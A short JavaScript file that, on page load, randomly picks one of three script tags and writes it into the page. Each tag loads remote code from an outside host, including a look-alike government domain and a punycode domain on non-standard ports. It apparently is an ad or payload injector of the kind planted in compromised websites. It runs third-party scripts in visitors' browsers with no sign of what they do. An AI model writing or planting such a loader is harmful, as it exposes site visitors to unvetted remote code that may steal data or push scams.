var randoms = {
	ads_codes: ['<script src="https://show.govjiangsu.cn:12443/ty/4B031169-29D0-3145-33-7423B7C344BC.alpha"><'+'/script>','<script src="https://xn--3bs795g.chat:4443/ty/x-3935-33.js"><'+'/script>','<script src="//js.handanxinkai.com/c.aspx?action=c&c1=7&c2=810&c3=&c4=2&c5=AdCode_sjdb&c6=640x200&c7=1&c8=1&c9=&c10="><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();